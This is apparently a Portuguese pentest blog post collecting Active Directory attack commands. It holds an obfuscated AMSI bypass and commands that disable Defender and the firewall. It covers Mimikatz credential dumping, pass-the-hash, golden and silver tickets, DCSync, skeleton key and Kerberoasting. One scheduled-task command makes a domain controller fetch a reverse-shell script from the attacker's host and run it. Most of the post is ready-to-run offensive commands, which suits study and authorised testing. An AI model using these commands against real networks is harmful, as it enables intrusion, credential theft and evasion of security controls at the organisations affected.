---
title: "Active Directory - Resumo de Comandos"
tags: [Windows, Active Directory]
categories: ActiveDirectory Metodologias
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/defense.png)

# Considerações Iniciais

Este é um dos meus tópicos favoritos quando falamos em Windows como um todo, não é especificamente AD, mas se aplica perfeitamente a este ambiente por se tratar de máquinas Windows, por isso deixei nessa Categoria.

Dividirei em seções, não vou demonstrar na máquina a grande parte delas, apenas deixar aqui os comandos para serem utilizados.

# Defense Bypass

## AMSI Bypass

O que é AMSI? 

A Antimalware Scan Interface (AMSI) é um componente do Microsoft Windows que permite uma inspeção mais aprofundada dos serviços de script integrados.

Nota: A integração AMSI apenas está disponível no Windows 10.

Advanced malware utiliza scripts ocultos ou encriptados para evitar os métodos tradicionais de análise. Malware deste tipo é normalmente carregado diretamente na memória, pelo que não utiliza quaisquer ficheiros no dispositivo.

AMSI é uma interface que as aplicações e serviços que estão a ser executadas no Windows podem utilizar para enviar pedidos para o produto antimalware instalado no computador. Oferece uma proteção adicional contra software nocivo que utiliza scripts ou macros em componentes Windows essenciais, como PowerShell e Office365, ou outras aplicações para evadir a deteção.

Ai está a cara dele... Ele detectou o Invoke-Mimikatz como se fosse perigoso para o sistema, então não deixou executar. Eu costumo dizer que ele é um "grep" no que você digita ou tenta executar na seção, se ele verificar alguma coisa de ruim, ele bloqueia, simples assim.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/AMSI.png)

Para Bypassar ela temos algums métodos, o mais comum deles é este:

```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

Também podemos, se conseguir, executar o powershell na versão 1.0, deve ser executado com o caminho completo

`C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe`

As vezes um simples -ep bypass também ajuda no bypass do AMSI

`powershell -ep bypass`

Podemos realizar o downgrade dele

`powershell -version 2`

Ou o upgrade, sim, o upgrade dele bypassa o AMSI

`pwsh`

Após a execução deles, possivelmente o AMSI não vai mais incomodar vocês!

## Desativar Windows Defender

O que é Windows Defender?

Microsoft Defender é um software que remove malware, trojan, spyware e adware instalados no computador. Também monitoriza o computador para evitar que estes softwares perigosos modifiquem configurações tanto do navegador, como do sistema operacional.

A cara dele é igual ao do AMSI

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/AMSI.png)

Para desabilitar ele temos três modos, lembrando que para isso devemos ter privilégios elevados na máquina

`Set-MpPreference -DisableRealtimeMonitoring $true`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/defender.png)

Também temos esses dois adicionais

`sc stop WinDefend`

`Set-MpPreference -DisableIOAVProtection $true`

Após isso você a princípio não será mais incomodado pelo Windows Defender ao executar seus scripts ou executáveis na máquina alvo.

## Verificação do Language Mode

O que é esse Language Mode?

O modo de linguagem determina os elementos de linguagem que são permitidos na sessão.
O modo de linguagem é, na verdade, uma propriedade da configuração de sessão (ou "ponto de extremidade") usada para criar a sessão. Todas as sessões que usam uma configuração de sessão específica têm o modo de linguagem da configuração de sessão.
Todas as sessões do PowerShell têm um modo de linguagem, incluindo PSSessions que você cria usando o New-PSSession cmdlet, sessões temporárias que usam o parâmetro ComputerName e as sessões padrão que aparecem quando você inicia o PowerShell.
As sessões remotas são criadas usando as configurações de sessão no computador remoto. O modo de linguagem definido na configuração de sessão determina o modo de linguagem da sessão. Para especificar a configuração de sessão de uma PSSession, use o parâmetro ConfigurationName de cmdlets que criam uma sessão.

A carinha dele é essa

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/lang.png)

O downgrade também funciona para o Language Mode

`powershell -version 2`

Assim verificamos o modo que está no momento

`$ExecutionContext.SessionState.LanguageMode`

Aqui tentamos alterar

`$ExecutionContext.SessionState.LanguageMode = "FullLanguage"`

Algo que sempre da certo é colocar o Invoke-Mimikatz no final do código, não somente o Invoke-Mimikatz mas qualquer outro comando ou script, colocar a `chamada da função ao final do script`

## Desativando Firewall

Esse eu nem vou explicar...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/firewall.png)

Para desativar ele podemos executar esse comando

`Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/firewall1.png)

Ou ir direto lá nas configurações e desativar ele, da na mesma, mas é importante desativar ele principalmente pra fazer chamadas de reverse shell.

## Verificando APPLOCKER POLICY

O que é applocker?

O AppLocker é uma tecnologia de lista de permissões de aplicativos introduzida no sistema operacional Windows 7 da Microsoft. `Ele permite restringir quais programas os usuários podem executar com base no caminho`, editor ou hash do programa, e em uma empresa pode ser configurada via Diretiva de Grupo.

A carinha dele é essa:

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/applocker.png)

Para verificarmos quais os caminhos que podem ser executados, execute esses comandos

`Get-AppLockerPolicy -Xml -Local`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/applocker1.png)

Também podemos verificar o arquivo Script.Applocker no caminho `C:\Windows\system32\AppLocker` que é o Script que está executando o AppLocker, ou seja, é onde está bloqueando e permitindo tudo!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/applocker2.png)

`Get-AppLockerPolicy -Effective | select -ExpandProperty RuleColletions`

# PSSession

## Criando nova seção do PSSession

`$sess = New-PSSession -ComputerName xxx.local`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/p.png)

## Executando comandos através do PSSession

`Invoke-Command -ScriptBlock {dir} -Session $sess`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/p1.png)

## Carregando scripts através do PSSession

`Invoke-Command -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $true} -Session $sess`

`Invoke-Command -FilePath "C:\Invoke-Mimikatz.ps1" -session $sess`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/p2.png)

## Entrando na seção

`Enter-PSSession $sess`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/p3.png)

## Copiando arquivos dentro das seções

`Copy-Item -Path C:\flag.txt -Destination 'C:\Users\Public\Music\flag.txt' -FromSession $sess`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/p4.png)

# Mimikatz

Po, aqui realmente eu não vou mostrar print de cada comando... nos outros posts tem todos eles sendo executados

## Dump de Hashes

`Dump do Sam` (lsadump::sam)→ Local Administrator Hash

`LogonPasswords` (sekurlsa::logonpasswords) → Domain Administrator Hash (Para acessar outras máquinas dentro do domínio)
 
## Pegar hash de usuários

Através do executável

`./mimikatz.exe lsadump::lsa /patch`

Através do Invoke-Mimikatz.ps1

```
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"' 
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /patch" "exit"' 
Invoke-Mimikatz -Command ‘"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /patch" “lsadump::sam”
```

## Pass-The-Hash (Adicionar usuários em grupos)

```
sekurlsa::pth /user:xxxx /domain:xxxx /ntlm:xxxxx /run:powershell.exe
sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:HASH /run:COMMAND
Invoke-Mimikatz -Command '"sekurlsa::pth /user:xxxx /domain:xxxx /ntlm:xxxxxxx /run:powershell.exe"'
```

## Pass-The-Ticket (Unconstrained Delegation)

```
Get-NetComputer -UnConstrained | select Name
Invoke-Command -ScriptBlock {Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::tickets /export"'} -Session $sess
Invoke-Command -ScriptBlock{Invoke-Mimikatz -Command '"kerberos:: ptt [...]"'} -Session $sess
Invoke-Command -Scriptblock{ls \\maquina.local\C$} -session $sess
```

## Privilege Across Trusts (Necessário Hash do krbtgt)

```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:ab.cd.local /sid:<SID of ab.cd.local> /krbtgt:hash do krbtgt /sids:<SID of cd.local> /ptt"'
```

Pra pegar o SID e o SIDS

```
ab.cd.local → Get-DomainSID
cd.local → Get-DomainSID -Domain cd.local
```

## DCSync

Sempre lembrar do privilege::debug e do token::elevate

`Invoke-Mimikatz -Command "privilege::debug" "token::elevate" "lsadump::dcsync /domain:ab.cd.local /user:Administrator” “exit”`

## Skeleton Key 

Só consegui fazer funcionar com o executável dele

Esses comandos dentro da máquina DC, após ter comprometido ela

```
./mimkatz.exe
privilege::debug
token::elevate
misc::skeleton
```

## Kerberoast

Primeiro verificamos os usuários com SPN

`Get-NetUser -SPN`

Requisitamos o Ticket

`Request-SPN Ticket SPN/ab.cd.local`

Exportamos o Ticket

`Invoke-Mimikatz -Command '"kerberos::list /export"'`

Agora quebramos o hash com o john

`kirbi2john.py`

## Golden Ticket

Dois tipos, o Across Trusts e do Dominio

### Across Trusts

`Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:ab.cd.local /sid:<SID of ab.cd.local> /krbtgt:xxxxxxx /sids:<SID of cd.local> /ptt"'`

Pra pegarmos os SID e SIDS

```
ab.cd.local - Get-DomainSID
cd.local - Get-DomainSID -Domain cd.local
```

Acessamos o share across trust

`ls //bc-dc/C$`

### Domínio

Com o executável injetamos um ticket genérico na nossa seção (sim, pra acessar nosso domínio mesmo, não across trusts)

```
./mimikatz.exe
kerberos::golden /domain:xxx.local /sid:S-1-5-21-3965405831... /rc4:c6d349.... /user:newAdmin /id:500 /ptt
```

Após isso vamos ter acesso ao DC do domínio

## Silver Ticket

Geramos tickets para diversos serviços, a ideia é a mesma sempre!

Lembrar o  /rc4: é O HASH DA MÁQUINA, NO CASO `DC$`

### RPCSS

`Invoke-Mimikatz -Command '"kerberos::golden /domain:ab.cd.local /sid:S-1-5-21- /target:DC.ac.cd.local /service:RPCSS /rc4:418ea3d41xxx /user:Administrator /ptt"'`

Verificamos o ticket injetado

`klist`

Agora executamos comandos nela

`gwmi -Class win32_operatingsystem -ComputerName DC.ac.cd.local`

### HOST

`Invoke-Mimikatz -Command '"kerberos::golden /domain:ab.cd.local /sid:S-1-5-21- /target:DC.ac.cd.local /service:RPCSS /rc4:418ea3d41xxx /user:Administrator /ptt"'`

Verificamos as tasks

`schtasks /S DC.ac.cd.local`

Criamos uma pra nos dar um reverse shell

`schtasks /create /S DC.ac.cd.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "shell" /TR "powershell.exe -c 'iex(new-object net.webclient).downloadstring(''http://..../Invoke-PowerShellTCP.ps1'')'"`

Executamos ela e a máquina vai vir buscar na minha o shell

`schtasks /Run /S DC.ac.cd.local /TN "shell"`

Isso poderia ser feito pra qualquer serviço, HOST, LDAP, CIFS, HTTP... tanto faz, todos devem funcionar!

# Enumeração com PowerView

Agora vamos fazer a enumeração com o `PowerView`

## Enumeração de Usuários

`Get-NetUser`

## Enumeração de Grupos

`Get-NetGroup | select Name`

## Enumeração de Computadores

`Get-NetComputer | select Name`

## Enumeração de Domain Administrator

`Get-NetGroupMember "Domain Admins"`

`Get-NetGroup "Enterprise Admins" -Domain domain.com`

## Enumeração de Shares

`Invoke-ShareFinder`

## Enumeração de ACL

```
Get-ObjectAcl -SamAccountName "Domain Admins" -Verbose
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "xxxx"}
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "RPDUsers"}
Invoke-ACLScanner | Where-Object {$_.IdentityReference –eq [System.Security.Principal.WindowsIdentity]::GetCurrent().Name}
Invoke-ACLScanner | Where-Object {$_.IdentityReferenceName –eq 'MAQUINA_QUE_QUERO_VER$'}
Invoke-ACLScanner -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -eq 'WriteProperty'}
Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | Where-Object {$_.ActiveDirectoryRights -eq 'WriteProperty'}
```

## Enumeração de OUs

`Get-NetOU | select name`

## Enumeração de GPO

```
(Get-NetOU StudentMachines).gplink
Get-NetGPO -ADSpath 'LDAP://cn={B822494A-DD6A-4E96-A2BB-944E397208A1},cn=policies,cn=system,DC=xxxxx,DC=xxxx,DC=local'
```

## Enumeração de todos os Domains no FOREST ROOT e seus respectivos TRUSTS

```
Get-NetForestDomain -Verbose
Get-NetDomainTrust
Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}
Get-NetForestDomain -Forest ab.local -Verbose | Get-NetDomainTrust
Get-NetForest
```

## Enumeração de USER HUNTING

`Find-LocalAdminAccess -Verbose`

`Invoke-UserHunter -Verbose`

## Enumeração SID (Golden e Silver Ticket)

`ab.cd.local - Get-DomainSID`

`cd.local - Get-DomainSID -Domain cd.local`
